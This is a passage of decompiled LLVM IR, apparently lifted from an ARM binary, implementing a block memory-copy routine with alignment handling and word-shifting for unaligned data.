  %v16_151c8 = inttoptr i32 %v15_151c8 to i32*
  %v17_151c8 = load i32, i32* %v16_151c8, align 4
  store i32 %v17_151c8, i32* @sb, align 4
  %v18_151c8 = add i32 %v0_151c8, 24
  %v19_151c8 = inttoptr i32 %v18_151c8 to i32*
  %v20_151c8 = load i32, i32* %v19_151c8, align 4
  store i32 %v20_151c8, i32* %sl.global-to-local, align 4
  %v21_151c8 = add i32 %v0_151c8, 28
  %v22_151c8 = inttoptr i32 %v21_151c8 to i32*
  %v23_151c8 = load i32, i32* %v22_151c8, align 4
  store i32 %v23_151c8, i32* %fp.global-to-local, align 4
  %v24_151c8 = add i32 %v0_151c8, 32
  store i32 %v24_151c8, i32* %r1.global-to-local, align 4
  %v1_151cc = add i32 %v0_151cc, -32
  store i32 %v1_151cc, i32* %r2.global-to-local, align 4
  %v2_151cc = icmp ugt i32 %v0_151cc, 31
  %v1_151d0 = inttoptr i32 %v0_151d0 to i32*
  store i32 %v2_151c8, i32* %v1_151d0, align 4
  %v3_151d0 = add i32 %v0_151d0, 4
  %v4_151d0 = inttoptr i32 %v3_151d0 to i32*
  %v5_151d0 = load i32, i32* @r5, align 4
  store i32 %v5_151d0, i32* %v4_151d0, align 4
  %v6_151d0 = add i32 %v0_151d0, 8
  %v7_151d0 = inttoptr i32 %v6_151d0 to i32*
  %v8_151d0 = load i32, i32* @r6, align 4
  store i32 %v8_151d0, i32* %v7_151d0, align 4
  %v9_151d0 = add i32 %v0_151d0, 12
  %v10_151d0 = inttoptr i32 %v9_151d0 to i32*
  %v11_151d0 = load i32, i32* @r7, align 4
  store i32 %v11_151d0, i32* %v10_151d0, align 4
  %v12_151d0 = add i32 %v0_151d0, 16
  %v13_151d0 = inttoptr i32 %v12_151d0 to i32*
  %v14_151d0 = load i32, i32* @r8, align 4
  store i32 %v14_151d0, i32* %v13_151d0, align 4
  %v15_151d0 = add i32 %v0_151d0, 20
  %v16_151d0 = inttoptr i32 %v15_151d0 to i32*
  %v17_151d0 = load i32, i32* @sb, align 4
  store i32 %v17_151d0, i32* %v16_151d0, align 4
  %v18_151d0 = add i32 %v0_151d0, 24
  %v19_151d0 = inttoptr i32 %v18_151d0 to i32*
  %v20_151d0 = load i32, i32* %sl.global-to-local, align 4
  store i32 %v20_151d0, i32* %v19_151d0, align 4
  %v21_151d0 = add i32 %v0_151d0, 28
  %v22_151d0 = inttoptr i32 %v21_151d0 to i32*
  %v23_151d0 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v23_151d0, i32* %v22_151d0, align 4
  %v24_151d0 = add i32 %v0_151d0, 32
  store i32 %v24_151d0, i32* %r0.global-to-local, align 4
  br i1 %v2_151cc, label %dec_label_pc_151c8.dec_label_pc_151c8_crit_edge, label %dec_label_pc_151d8

dec_label_pc_151c8.dec_label_pc_151c8_crit_edge:  ; preds = %dec_label_pc_151c8
  %v0_151cc.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_151c8

dec_label_pc_151d8:                               ; preds = %dec_label_pc_151c8
  %v6_151cc = icmp slt i32 %v1_151cc, 0
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  store i1 %v6_151cc, i1* %cpsr_n.global-to-local, align 1
  %v0_151d8 = load i32, i32* %r2.global-to-local, align 4
  %v1_151d8 = add i32 %v0_151d8, 32
  store i32 %v1_151d8, i32* @r2, align 4
  br label %dec_label_pc_151dc

dec_label_pc_151dc:                               ; preds = %dec_label_pc_151c0, %dec_label_pc_151d8
  %v1_151f0 = phi i32 [ %v0_151d063, %dec_label_pc_151c0 ], [ %v24_151d0, %dec_label_pc_151d8 ]
  %v0_151e4 = phi i32 [ %v1_151c0, %dec_label_pc_151c0 ], [ %v1_151d8, %dec_label_pc_151d8 ]
  %v1_151dc = urem i32 %v0_151e4, 32
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_151dc = icmp eq i32 %v1_151dc, 0
  br i1 %v2_151dc, label %.thread3, label %dec_label_pc_151e4

dec_label_pc_151e4:                               ; preds = %dec_label_pc_151dc
  %v1_151e4 = and i32 %v0_151e4, 16
  %v2_151e4 = icmp ne i32 %v1_151e4, 0
  store i1 %v2_151e4, i1* %cpsr_c.global-to-local, align 1
  %v3_151e4 = mul i32 %v0_151e4, 268435456
  store i32 %v3_151e4, i32* %ip.global-to-local, align 4
  %v4_151e4 = icmp slt i32 %v3_151e4, 0
  store i1 %v4_151e4, i1* %cpsr_n.global-to-local, align 1
  br i1 %v2_151e4, label %bb139, label %bb140

bb139:                                            ; preds = %dec_label_pc_151e4
  %v1_151e8 = load i32, i32* %r1.global-to-local, align 4
  %v2_151e8 = inttoptr i32 %v1_151e8 to i32*
  %v3_151e8 = load i32, i32* %v2_151e8, align 4
  store i32 %v3_151e8, i32* @r4, align 4
  %v4_151e8 = add i32 %v1_151e8, 4
  %v5_151e8 = inttoptr i32 %v4_151e8 to i32*
  %v6_151e8 = load i32, i32* %v5_151e8, align 4
  store i32 %v6_151e8, i32* @r5, align 4
  %v7_151e8 = add i32 %v1_151e8, 8
  %v8_151e8 = inttoptr i32 %v7_151e8 to i32*
  %v9_151e8 = load i32, i32* %v8_151e8, align 4
  store i32 %v9_151e8, i32* @r6, align 4
  %v10_151e8 = add i32 %v1_151e8, 12
  %v11_151e8 = inttoptr i32 %v10_151e8 to i32*
  %v12_151e8 = load i32, i32* %v11_151e8, align 4
  store i32 %v12_151e8, i32* @r7, align 4
  %v13_151e8 = add i32 %v1_151e8, 16
  store i32 %v13_151e8, i32* %r1.global-to-local, align 4
  br i1 %v4_151e4, label %bb141, label %.thread93

bb140:                                            ; preds = %dec_label_pc_151e4
  br i1 %v4_151e4, label %._crit_edge, label %.thread97

._crit_edge:                                      ; preds = %bb140
  %v1_151ec.pre = load i32, i32* %r1.global-to-local, align 4
  br label %bb141

bb141:                                            ; preds = %bb139, %._crit_edge
  %v1_151ec = phi i32 [ %v1_151ec.pre, %._crit_edge ], [ %v13_151e8, %bb139 ]
  %v2_151ec = inttoptr i32 %v1_151ec to i32*
  %v3_151ec = load i32, i32* %v2_151ec, align 4
  store i32 %v3_151ec, i32* @r8, align 4
  %v4_151ec = add i32 %v1_151ec, 4
  %v5_151ec = inttoptr i32 %v4_151ec to i32*
  %v6_151ec = load i32, i32* %v5_151ec, align 4
  store i32 %v6_151ec, i32* @sb, align 4
  %v7_151ec = add i32 %v1_151ec, 8
  store i32 %v7_151ec, i32* %r1.global-to-local, align 4
  br i1 %v2_151e4, label %bb141..thread93_crit_edge, label %.thread95

bb141..thread93_crit_edge:                        ; preds = %bb141
  %v3_151f0.pre = load i32, i32* @r4, align 4
  br label %.thread93

.thread93:                                        ; preds = %bb141..thread93_crit_edge, %bb139
  %v3_151f0 = phi i32 [ %v3_151f0.pre, %bb141..thread93_crit_edge ], [ %v3_151e8, %bb139 ]
  %v2_151f0 = inttoptr i32 %v1_151f0 to i32*
  store i32 %v3_151f0, i32* %v2_151f0, align 4
  %v4_151f0 = add i32 %v1_151f0, 4
  %v5_151f0 = inttoptr i32 %v4_151f0 to i32*
  %v6_151f0 = load i32, i32* @r5, align 4
  store i32 %v6_151f0, i32* %v5_151f0, align 4
  %v7_151f0 = add i32 %v1_151f0, 8
  %v8_151f0 = inttoptr i32 %v7_151f0 to i32*
  %v9_151f0 = load i32, i32* @r6, align 4
  store i32 %v9_151f0, i32* %v8_151f0, align 4
  %v10_151f0 = add i32 %v1_151f0, 12
  %v11_151f0 = inttoptr i32 %v10_151f0 to i32*
  %v12_151f0 = load i32, i32* @r7, align 4
  store i32 %v12_151f0, i32* %v11_151f0, align 4
  %v13_151f0 = add i32 %v1_151f0, 16
  store i32 %v13_151f0, i32* %r0.global-to-local, align 4
  br i1 %v4_151e4, label %.thread93..thread95_crit_edge, label %.thread97

.thread93..thread95_crit_edge:                    ; preds = %.thread93
  %v3_151f4.pre = load i32, i32* @r8, align 4
  br label %.thread95

.thread95:                                        ; preds = %.thread93..thread95_crit_edge, %bb141
  %v3_151f4 = phi i32 [ %v3_151f4.pre, %.thread93..thread95_crit_edge ], [ %v3_151ec, %bb141 ]
  %v1_151f496 = phi i32 [ %v13_151f0, %.thread93..thread95_crit_edge ], [ %v1_151f0, %bb141 ]
  %v2_151f4 = inttoptr i32 %v1_151f496 to i32*
  store i32 %v3_151f4, i32* %v2_151f4, align 4
  %v4_151f4 = add i32 %v1_151f496, 4
  %v5_151f4 = inttoptr i32 %v4_151f4 to i32*
  %v6_151f4 = load i32, i32* @sb, align 4
  store i32 %v6_151f4, i32* %v5_151f4, align 4
  %v7_151f4 = add i32 %v1_151f496, 8
  store i32 %v7_151f4, i32* %r0.global-to-local, align 4
  br label %.thread97

.thread97:                                        ; preds = %bb140, %.thread93, %.thread95
  %v2_15204 = phi i32 [ %v13_151f0, %.thread93 ], [ %v7_151f4, %.thread95 ], [ %v1_151f0, %bb140 ]
  %v0_151f8 = load i32, i32* @r2, align 4
  %v1_151f8 = and i32 %v0_151f8, 4
  %v2_151f8 = icmp ne i32 %v1_151f8, 0
  store i1 %v2_151f8, i1* %cpsr_c.global-to-local, align 1
  %v3_151f8 = mul i32 %v0_151f8, 1073741824
  store i32 %v3_151f8, i32* @ip, align 4
  %v4_151f8 = icmp slt i32 %v3_151f8, 0
  store i1 %v4_151f8, i1* %cpsr_n.global-to-local, align 1
  br i1 %v2_151f8, label %bb142, label %bb143

bb142:                                            ; preds = %.thread97
  %v1_151fc = load i32, i32* %r1.global-to-local, align 4
  %v2_151fc = inttoptr i32 %v1_151fc to i32*
  %v3_151fc = load i32, i32* %v2_151fc, align 4
  store i32 %v3_151fc, i32* @r3, align 4
  %v5_151fc = add i32 %v1_151fc, 4
  store i32 %v5_151fc, i32* %r1.global-to-local, align 4
  br i1 %v4_151f8, label %.thread108, label %bb144

.thread108:                                       ; preds = %bb142
  %v2_15200101 = inttoptr i32 %v5_151fc to i16*
  %v3_15200102 = load i16, i16* %v2_15200101, align 2
  %v4_15200103 = zext i16 %v3_15200102 to i32
  store i32 %v4_15200103, i32* %r4.global-to-local, align 4
  %v6_15200104 = add i32 %v1_151fc, 2
  store i32 %v6_15200104, i32* %r1.global-to-local, align 4
  %v3_15204110 = inttoptr i32 %v2_15204 to i32*
  store i32 %v3_151fc, i32* %v3_15204110, align 4
  %v4_15204111 = load i32, i32* %r0.global-to-local, align 4
  %v5_15204112 = add i32 %v4_15204111, 4
  store i32 %v5_15204112, i32* %r0.global-to-local, align 4
  %v1_15208.pre = load i32, i32* %r4.global-to-local, align 4
  %extract.t195 = trunc i32 %v1_15208.pre to i16
  br label %bb145

bb143:                                            ; preds = %.thread97
  br i1 %v4_151f8, label %.thread105, label %.thread107

.thread105:                                       ; preds = %bb143
  %v1_15200.pre = load i32, i32* %r1.global-to-local, align 4
  %v2_15200 = inttoptr i32 %v1_15200.pre to i16*
  %v3_15200 = load i16, i16* %v2_15200, align 2
  %v4_15200 = zext i16 %v3_15200 to i32
  store i32 %v4_15200, i32* %r4.global-to-local, align 4
  %v6_15200 = add i32 %v1_15200.pre, -2
  store i32 %v6_15200, i32* %r1.global-to-local, align 4
  br label %bb145

bb144:                                            ; preds = %bb142
  %v3_15204 = inttoptr i32 %v2_15204 to i32*
  store i32 %v3_151fc, i32* %v3_15204, align 4
  %v4_15204 = load i32, i32* %r0.global-to-local, align 4
  %v5_15204 = add i32 %v4_15204, 4
  store i32 %v5_15204, i32* %r0.global-to-local, align 4
  br label %.thread107

bb145:                                            ; preds = %.thread108, %.thread105
  %v1_15208.off0 = phi i16 [ %v3_15200, %.thread105 ], [ %extract.t195, %.thread108 ]
  %v3_15208106 = phi i32 [ %v2_15204, %.thread105 ], [ %v5_15204112, %.thread108 ]
  %v4_15208 = inttoptr i32 %v3_15208106 to i16*
  store i16 %v1_15208.off0, i16* %v4_15208, align 2
  %v5_15208 = load i32, i32* %r0.global-to-local, align 4
  %v6_15208 = add i32 %v5_15208, -2
  store i32 %v6_15208, i32* %r0.global-to-local, align 4
  br label %.thread107

.thread107:                                       ; preds = %bb143, %bb144, %bb145
  %v3_15214 = phi i32 [ %v5_15204, %bb144 ], [ %v6_15208, %bb145 ], [ %v2_15204, %bb143 ]
  %v0_1520c = load i32, i32* @r2, align 4
  %v1_1520c = urem i32 %v0_1520c, 2
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_1520c = icmp eq i32 %v1_1520c, 0
  br i1 %v2_1520c, label %.thread3, label %bb146

bb146:                                            ; preds = %.thread107
  %v1_15210 = load i32, i32* %r1.global-to-local, align 4
  %v2_15210 = inttoptr i32 %v1_15210 to i8*
  %v3_15210 = load i8, i8* %v2_15210, align 1
  %v4_15210 = zext i8 %v3_15210 to i32
  store i32 %v4_15210, i32* @r3, align 4
  %v4_15214 = inttoptr i32 %v3_15214 to i8*
  store i8 %v3_15210, i8* %v4_15214, align 1
  br label %.thread3

.thread3:                                         ; preds = %.thread107, %dec_label_pc_151dc, %bb146
  %v2_15218 = load i32, i32* %stack_var_-40, align 4
  store i32 %v2_15218, i32* @r5, align 4
  store i32 %v5_15184, i32* @r6, align 4
  store i32 %v8_15184, i32* @r7, align 4
  store i32 %v11_15184, i32* @r8, align 4
  store i32 %v14_15184, i32* @sb, align 4
  store i32 %v17_15184, i32* @sl, align 4
  store i32 %v20_15184, i32* @fp, align 4
  store i32 %v3_1513c, i32* %r0.global-to-local, align 4
  store i32 %v8_1513c, i32* @r4, align 4
  store i32 %v11_1513c, i32* @lr, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  ret i32 %v3_1513c

dec_label_pc_1522c:                               ; preds = %.thread1
  %v0_1522c = load i32, i32* %r2.global-to-local, align 4
  %v1_1522c = add i32 %v0_1522c, -4
  %v2_1522c = icmp ugt i32 %v0_1522c, 3
  store i1 %v2_1522c, i1* %cpsr_c.global-to-local, align 1
  %v6_1522c = icmp slt i32 %v1_1522c, 0
  store i1 %v6_1522c, i1* %cpsr_n.global-to-local, align 1
  %v3_15230 = icmp ult i32 %v0_1522c, 2
  br i1 %v3_15230, label %dec_label_pc_15418, label %dec_label_pc_15234

dec_label_pc_15234:                               ; preds = %dec_label_pc_1522c
  %v2_15234 = load i32, i32* @r5, align 4
  store i32 %v2_15234, i32* %stack_var_-40, align 4
  %v5_15234 = load i32, i32* @r6, align 4
  %v8_15234 = load i32, i32* @r7, align 4
  %v11_15234 = load i32, i32* @r8, align 4
  %v14_15234 = load i32, i32* @sb, align 4
  %v17_15234 = load i32, i32* @sl, align 4
  %v20_15234 = load i32, i32* @fp, align 4
  %v1_15238 = sub i32 0, %v1_151a8
  %v1_1523c = urem i32 %v1_15238, 4
  store i32 %v1_1523c, i32* %r5.global-to-local, align 4
  %v3_15240 = mul nuw nsw i32 %v1_1523c, 8
  store i32 %v3_15240, i32* @ip, align 4
  %v1_15244 = sub nsw i32 32, %v3_15240
  store i32 %v1_15244, i32* %lr.global-to-local, align 4
  %v1_15248 = inttoptr i32 %v1_15178 to i32*
  %v2_15248 = load i32, i32* %v1_15248, align 4
  store i32 %v2_15248, i32* @r3, align 4
  %v4_15248 = add i32 %v1_15178, 4
  store i32 %v4_15248, i32* %r1.global-to-local, align 4
  store i32 %v1_1522c, i32* %r2.global-to-local, align 4
  %v1_15250 = and i32 %v1_15238, 2
  %v2_15250 = icmp ne i32 %v1_15250, 0
  store i1 %v2_15250, i1* %cpsr_c.global-to-local, align 1
  %v3_15250 = shl i32 %v1_15238, 31
  store i32 %v3_15250, i32* %r5.global-to-local, align 4
  %v4_15250 = icmp ne i32 %v3_15250, 0
  store i1 %v4_15250, i1* %cpsr_n.global-to-local, align 1
  %v2_15254 = trunc i32 %v2_15248 to i8
  br i1 %v4_15250, label %bb147, label %thread-pre-split

bb147:                                            ; preds = %dec_label_pc_15234
  %v4_15254 = inttoptr i32 %v1_151a8 to i8*
  store i8 %v2_15254, i8* %v4_15254, align 1
  %v5_15254 = load i32, i32* %r0.global-to-local, align 4
  %v6_15254 = add i32 %v5_15254, 1
  store i32 %v6_15254, i32* %r0.global-to-local, align 4
  %v0_15258.pr = load i1, i1* %cpsr_n.global-to-local, align 1
  br i1 %v0_15258.pr, label %bb148, label %.thread-pre-split_crit_edge

.thread-pre-split_crit_edge:                      ; preds = %bb147
  %v0_1525c.pr.pre = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_1525c.pr.pre, label %.thread-pre-split_crit_edge.thread-pre-split._crit_edge_crit_edge, label %.thread9

.thread-pre-split_crit_edge.thread-pre-split._crit_edge_crit_edge: ; preds = %.thread-pre-split_crit_edge
  %v1_1525c.pre.pre = load i32, i32* @r3, align 4
  %extract.t192 = trunc i32 %v1_1525c.pre.pre to i8
  br label %bb149

thread-pre-split:                                 ; preds = %dec_label_pc_15234
  br i1 %v2_15250, label %bb149, label %.thread9

bb148:                                            ; preds = %bb147
  %v1_15258 = load i32, i32* @r3, align 4
  %v2_15258 = and i32 %v1_15258, 128
  %v3_15258 = icmp ne i32 %v2_15258, 0
  store i1 %v3_15258, i1* %cpsr_c.global-to-local, align 1
  %v4_15258 = udiv i32 %v1_15258, 256
  store i32 %v4_15258, i32* @r3, align 4
  %extract.t86 = trunc i32 %v4_15258 to i8
  br i1 %v3_15258, label %bb149, label %.thread9

bb149:                                            ; preds = %thread-pre-split, %.thread-pre-split_crit_edge.thread-pre-split._crit_edge_crit_edge, %bb148
  %v3_1525c = phi i32 [ %v6_15254, %bb148 ], [ %v6_15254, %.thread-pre-split_crit_edge.thread-pre-split._crit_edge_crit_edge ], [ %v1_151a8, %thread-pre-split ]
  %v1_1525c.off0 = phi i8 [ %extract.t86, %bb148 ], [ %extract.t192, %.thread-pre-split_crit_edge.thread-pre-split._crit_edge_crit_edge ], [ %v2_15254, %thread-pre-split ]
  %v4_1525c = inttoptr i32 %v3_1525c to i8*
  store i8 %v1_1525c.off0, i8* %v4_1525c, align 1
  %v5_1525c = load i32, i32* %r0.global-to-local, align 4
  %v6_1525c = add i32 %v5_1525c, 1
  store i32 %v6_1525c, i32* %r0.global-to-local, align 4
  %v0_15260.pr = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_15260.pr, label %bb150, label %.thread9

bb150:                                            ; preds = %bb149
  %v1_15260 = load i32, i32* @r3, align 4
  %v2_15260 = and i32 %v1_15260, 128
  %v3_15260 = icmp ne i32 %v2_15260, 0
  store i1 %v3_15260, i1* %cpsr_c.global-to-local, align 1
  %v4_15260 = udiv i32 %v1_15260, 256
  store i32 %v4_15260, i32* @r3, align 4
  br i1 %v3_15260, label %.thread6, label %.thread9

.thread6:                                         ; preds = %bb150
  %v2_15264 = trunc i32 %v4_15260 to i8
  %v4_15264 = inttoptr i32 %v6_1525c to i8*
  store i8 %v2_15264, i8* %v4_15264, align 1
  %v5_15264 = load i32, i32* %r0.global-to-local, align 4
  %v6_15264 = add i32 %v5_15264, 1
  store i32 %v6_15264, i32* %r0.global-to-local, align 4
  %v0_15268.pr.pr = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_15268.pr.pr, label %bb151, label %.thread9

bb151:                                            ; preds = %.thread6
  %v1_15268 = load i32, i32* @r3, align 4
  %v2_15268 = and i32 %v1_15268, 128
  %v3_15268 = icmp ne i32 %v2_15268, 0
  store i1 %v3_15268, i1* %cpsr_c.global-to-local, align 1
  %v4_15268 = udiv i32 %v1_15268, 256
  store i32 %v4_15268, i32* @r3, align 4
  br label %.thread9

.thread9:                                         ; preds = %.thread-pre-split_crit_edge, %bb149, %bb148, %thread-pre-split, %bb150, %.thread6, %bb151
  %v0_1527430 = phi i32 [ %v6_1525c, %bb149 ], [ %v6_15254, %bb148 ], [ %v1_151a8, %thread-pre-split ], [ %v6_1525c, %bb150 ], [ %v6_15264, %.thread6 ], [ %v6_15264, %bb151 ], [ %v6_15254, %.thread-pre-split_crit_edge ]
  %v0_1526c = load i32, i32* %r2.global-to-local, align 4
  %v1_1526c = add i32 %v0_1526c, -4
  %v2_1526c = icmp ugt i32 %v0_1526c, 3
  store i1 %v2_1526c, i1* %cpsr_c.global-to-local, align 1
  %v6_1526c = icmp slt i32 %v1_1526c, 0
  store i1 %v6_1526c, i1* %cpsr_n.global-to-local, align 1
  %v3_15270 = icmp ult i32 %v0_1526c, 2
  br i1 %v3_15270, label %dec_label_pc_153fc, label %dec_label_pc_15274

dec_label_pc_15274:                               ; preds = %.thread9, %dec_label_pc_1527c
  %v0_15280 = phi i32 [ %v0_15290, %dec_label_pc_1527c ], [ %v0_1526c, %.thread9 ]
  %v1_1528c = phi i32 [ %v4_1528c, %dec_label_pc_1527c ], [ %v0_1527430, %.thread9 ]
  %v1_15274 = and i32 %v1_1528c, 28
  %v2_15274 = icmp eq i32 %v1_15274, 0
  br i1 %v2_15274, label %dec_label_pc_1529c.loopexit, label %dec_label_pc_1527c

dec_label_pc_1527c:                               ; preds = %dec_label_pc_15274
  %v0_1527c = load i32, i32* %r1.global-to-local, align 4
  %v1_1527c = inttoptr i32 %v0_1527c to i32*
  %v2_1527c = load i32, i32* %v1_1527c, align 4
  store i32 %v2_1527c, i32* %r5.global-to-local, align 4
  %v4_1527c = add i32 %v0_1527c, 4
  store i32 %v4_1527c, i32* %r1.global-to-local, align 4
  %v1_15280 = add i32 %v0_15280, -4
  store i32 %v1_15280, i32* %r2.global-to-local, align 4
  %v0_15284 = load i32, i32* @r3, align 4
  %v2_15284 = load i32, i32* %lr.global-to-local, align 4
  %v7_15284 = shl i32 %v2_1527c, %v2_15284
  %v8_15284 = or i32 %v7_15284, %v0_15284
  store i32 %v8_15284, i32* %r4.global-to-local, align 4
  %v1_15288 = load i32, i32* @ip, align 4
  %v6_15288 = lshr i32 %v2_1527c, %v1_15288
  store i32 %v6_15288, i32* @r3, align 4
  %v2_1528c = inttoptr i32 %v1_1528c to i32*
  store i32 %v8_15284, i32* %v2_1528c, align 4
  %v3_1528c = load i32, i32* %r0.global-to-local, align 4
  %v4_1528c = add i32 %v3_1528c, 4
  store i32 %v4_1528c, i32* %r0.global-to-local, align 4
  %v0_15290 = load i32, i32* %r2.global-to-local, align 4
  %v2_15290 = icmp ugt i32 %v0_15290, 3
  store i1 %v2_15290, i1* %cpsr_c.global-to-local, align 1
  br i1 %v2_15290, label %dec_label_pc_15274, label %dec_label_pc_15298

dec_label_pc_15298:                               ; preds = %dec_label_pc_1527c
  %v1_15290 = add i32 %v0_15290, -4
  %v6_15290 = icmp slt i32 %v1_15290, 0
  store i1 %v6_15290, i1* %cpsr_n.global-to-local, align 1
  %v3_15298 = icmp ult i32 %v0_15290, 2
  br i1 %v3_15298, label %dec_label_pc_153fc, label %dec_label_pc_1529c

dec_label_pc_1529c.loopexit:                      ; preds = %dec_label_pc_15274
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_1529c

dec_label_pc_1529c:                               ; preds = %dec_label_pc_1529c.loopexit, %dec_label_pc_15298
  %v0_1530437 = phi i32 [ %v1_1528c, %dec_label_pc_1529c.loopexit ], [ %v4_1528c, %dec_label_pc_15298 ]
  %v0_1529c = phi i32 [ %v0_15280, %dec_label_pc_1529c.loopexit ], [ %v0_15290, %dec_label_pc_15298 ]
  %v1_1529c = add i32 %v0_1529c, -32
  store i32 %v1_1529c, i32* %r2.global-to-local, align 4
  %v2_1529c = icmp ugt i32 %v0_1529c, 31
  store i1 %v2_1529c, i1* %cpsr_c.global-to-local, align 1
  %v6_1529c = icmp slt i32 %v1_1529c, 0
  store i1 %v6_1529c, i1* %cpsr_n.global-to-local, align 1
  %v3_152a0 = icmp ult i32 %v1_1529c, 30
  br i1 %v3_152a0, label %dec_label_pc_153d0, label %dec_label_pc_152a4

dec_label_pc_152a4:                               ; preds = %dec_label_pc_1529c
  %v0_152a4 = load i32, i32* @ip, align 4
  %v1_152a4 = add i32 %v0_152a4, -24
  %v2_152a4 = icmp ugt i32 %v0_152a4, 23
  store i1 %v2_152a4, i1* %cpsr_c.global-to-local, align 1
  %v6_152a4 = icmp slt i32 %v1_152a4, 0
  store i1 %v6_152a4, i1* %cpsr_n.global-to-local, align 1
  %v7_152a4 = icmp eq i32 %v0_152a4, 24
  br i1 %v7_152a4, label %dec_label_pc_15374, label %dec_label_pc_152ac

dec_label_pc_152ac:                               ; preds = %dec_label_pc_152a4
  %v1_152ac = add i32 %v0_152a4, -8
  %v2_152ac = icmp ugt i32 %v0_152a4, 7
  store i1 %v2_152ac, i1* %cpsr_c.global-to-local, align 1
  %v6_152ac = icmp slt i32 %v1_152ac, 0
  store i1 %v6_152ac, i1* %cpsr_n.global-to-local, align 1
  %v7_152ac = icmp eq i32 %v0_152a4, 8
  %v0_15314 = load i32, i32* %r1.global-to-local, align 4
  %v1_15314 = inttoptr i32 %v0_15314 to i32*
  %v2_15314 = load i32, i32* %v1_15314, align 4
  store i32 %v2_15314, i32* %ip.global-to-local, align 4
  %v4_15314 = add i32 %v0_15314, 4
  store i32 %v4_15314, i32* %r1.global-to-local, align 4
  br i1 %v7_152ac, label %dec_label_pc_15318, label %dec_label_pc_152b8

dec_label_pc_152b8:                               ; preds = %dec_label_pc_152ac, %.dec_label_pc_152b8_crit_edge
  %v0_15304 = phi i32 [ %v24_15304, %.dec_label_pc_152b8_crit_edge ], [ %v0_1530437, %dec_label_pc_152ac ]
  %v0_152c0 = phi i32 [ %v0_152c0.pre, %.dec_label_pc_152b8_crit_edge ], [ %v1_1529c, %dec_label_pc_152ac ]
  %v0_152bc = phi i32 [ %v0_152bc.pre, %.dec_label_pc_152b8_crit_edge ], [ %v4_15314, %dec_label_pc_152ac ]
  %v1_152c8 = phi i32 [ %v0_152b8.pre, %.dec_label_pc_152b8_crit_edge ], [ %v2_15314, %dec_label_pc_152ac ]
  store i32 %v1_152c8, i32* %r4.global-to-local, align 4
  %v1_152bc = inttoptr i32 %v0_152bc to i32*
  %v2_152bc = load i32, i32* %v1_152bc, align 4
  store i32 %v2_152bc, i32* %r5.global-to-local, align 4
  %v3_152bc = add i32 %v0_152bc, 4
  %v4_152bc = inttoptr i32 %v3_152bc to i32*
  %v5_152bc = load i32, i32* %v4_152bc, align 4
  store i32 %v5_152bc, i32* %r6.global-to-local, align 4
  %v6_152bc = add i32 %v0_152bc, 8
  %v7_152bc = inttoptr i32 %v6_152bc to i32*
  %v8_152bc = load i32, i32* %v7_152bc, align 4
  store i32 %v8_152bc, i32* %r7.global-to-local, align 4
  %v9_152bc = add i32 %v0_152bc, 12
  %v10_152bc = inttoptr i32 %v9_152bc to i32*
  %v11_152bc = load i32, i32* %v10_152bc, align 4
  store i32 %v11_152bc, i32* %r8.global-to-local, align 4
  %v12_152bc = add i32 %v0_152bc, 16
  %v13_152bc = inttoptr i32 %v12_152bc to i32*
  %v14_152bc = load i32, i32* %v13_152bc, align 4
  store i32 %v14_152bc, i32* %sb.global-to-local, align 4
  %v15_152bc = add i32 %v0_152bc, 20
  %v16_152bc = inttoptr i32 %v15_152bc to i32*
  %v17_152bc = load i32, i32* %v16_152bc, align 4
  store i32 %v17_152bc, i32* %sl.global-to-local, align 4
  %v18_152bc = add i32 %v0_152bc, 24
  %v19_152bc = inttoptr i32 %v18_152bc to i32*
  %v20_152bc = load i32, i32* %v19_152bc, align 4
  store i32 %v20_152bc, i32* %fp.global-to-local, align 4
  %v21_152bc = add i32 %v0_152bc, 28
  store i32 %v21_152bc, i32* %r1.global-to-local, align 4
  %v1_152c0 = add i32 %v0_152c0, -32
  store i32 %v1_152c0, i32* %r2.global-to-local, align 4
  %v2_152c0 = icmp ugt i32 %v0_152c0, 31
  br i1 %v2_152c0, label %bb152, label %bb153

bb152:                                            ; preds = %dec_label_pc_152b8
  %v2_152c4 = inttoptr i32 %v21_152bc to i32*
  %v3_152c4 = load i32, i32* %v2_152c4, align 4
  store i32 %v3_152c4, i32* %ip.global-to-local, align 4
  %v5_152c4 = add i32 %v0_152bc, 32
  store i32 %v5_152c4, i32* %r1.global-to-local, align 4
  br label %bb153

bb153:                                            ; preds = %dec_label_pc_152b8, %bb152
  %v0_152c8 = load i32, i32* @r3, align 4
  %v4_152c8 = mul i32 %v1_152c8, 65536
  %v5_152c8 = or i32 %v0_152c8, %v4_152c8
  %v3_152cc = udiv i32 %v1_152c8, 65536
  %v4_152d0 = mul i32 %v2_152bc, 65536
  %v5_152d0 = or i32 %v4_152d0, %v3_152cc
  store i32 %v5_152d0, i32* %r4.global-to-local, align 4
  %v3_152d4 = udiv i32 %v2_152bc, 65536
  %v4_152d8 = mul i32 %v5_152bc, 65536
  %v5_152d8 = or i32 %v4_152d8, %v3_152d4
  store i32 %v5_152d8, i32* %r5.global-to-local, align 4
  %v3_152dc = udiv i32 %v5_152bc, 65536
  %v4_152e0 = mul i32 %v8_152bc, 65536
  %v5_152e0 = or i32 %v4_152e0, %v3_152dc
  store i32 %v5_152e0, i32* %r6.global-to-local, align 4
  %v3_152e4 = udiv i32 %v8_152bc, 65536
  %v4_152e8 = mul i32 %v11_152bc, 65536
  %v5_152e8 = or i32 %v4_152e8, %v3_152e4
  store i32 %v5_152e8, i32* %r7.global-to-local, align 4
  %v3_152ec = udiv i32 %v11_152bc, 65536
  %v4_152f0 = mul i32 %v14_152bc, 65536
  %v5_152f0 = or i32 %v4_152f0, %v3_152ec
  store i32 %v5_152f0, i32* %r8.global-to-local, align 4
  %v3_152f4 = udiv i32 %v14_152bc, 65536
  %v4_152f8 = mul i32 %v17_152bc, 65536
  %v5_152f8 = or i32 %v4_152f8, %v3_152f4
  store i32 %v5_152f8, i32* %sb.global-to-local, align 4
  %v3_152fc = udiv i32 %v17_152bc, 65536
  %v4_15300 = mul i32 %v20_152bc, 65536
  %v5_15300 = or i32 %v4_15300, %v3_152fc
  store i32 %v5_15300, i32* %sl.global-to-local, align 4
